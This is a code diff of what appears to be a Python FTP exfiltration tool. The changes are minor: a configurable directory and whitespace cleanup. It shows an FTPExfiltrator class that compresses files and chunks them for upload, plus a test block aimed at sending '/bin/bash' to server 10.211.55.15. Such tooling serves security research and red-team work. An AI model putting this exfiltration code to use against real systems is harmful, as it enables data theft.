@@ -24,8 +24,9 @@ SLEEP = 0.01
 
 
 class GetContent():
-	def __init__(self, dir=None):
+	def __init__(self, dir="."):
 		self.file_content = None
+		self.dir = dir
 
 	def get_file(self):
 		self.decode_file()
@@ -36,7 +37,7 @@ class GetContent():
 				crc = base58.b58decode(header[2].strip())
 				crc = int(crc)
 
-		# Create a sorted list by the integers. 
+		# Create a sorted list by the integers.
 		dd_list = []
 		for chunk in self.file_content:
 			try:
@@ -71,7 +72,7 @@ class GetContent():
 			f.close()
 
 	def decode_file(self):
-		d = '.'
+		d = self.dir
 		all_dirs = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
 		rel_dirs = []
 		for i in all_dirs:
@@ -79,12 +80,12 @@ class GetContent():
 		sys.stdout.write("\t[+]\tTotal of %s relevant directories.\n" % len(rel_dirs))
 		self.file_content = rel_dirs
 
-	
+
 
 class FTPExfiltrator():
 	def __init__(self, file2exfil=None, server=None, port=21, creds=(), tls=False):
 		"""
-		Default init, get all variables and verify. 
+		Default init, get all variables and verify.
 		"""
 		self.file_chunks = None
 		self.file_crc = None
@@ -130,7 +131,7 @@ class FTPExfiltrator():
 	def split_file(self, raw_content):
 		"""
 		Splits the file into chunks
-		"""	
+		"""
 
 		# Compress raw file:
 		raw_content = zlib.compress(raw_content, 9)
@@ -145,7 +146,7 @@ class FTPExfiltrator():
 
 	def get_file_content(self):
 		"""
-		Get the content of the file in an organized fashion. 
+		Get the content of the file in an organized fashion.
 		:param self: the class
 		:return: File content or ERR
 		"""
@@ -216,7 +217,7 @@ class FTPExfiltrator():
 
 
 if __name__ == "__main__":
-	# You are in the testing zone. 
+	# You are in the testing zone.
 	testFlag = 1
 	if testFlag == 0:
 		FTPexf = FTPExfiltrator(server="10.211.55.15", file2exfil="/bin/bash")
@@ -226,5 +227,3 @@ if __name__ == "__main__":
 	elif testFlag == 1:
 		FTPHand = GetContent()
 		FTPHand.get_file()
-
-
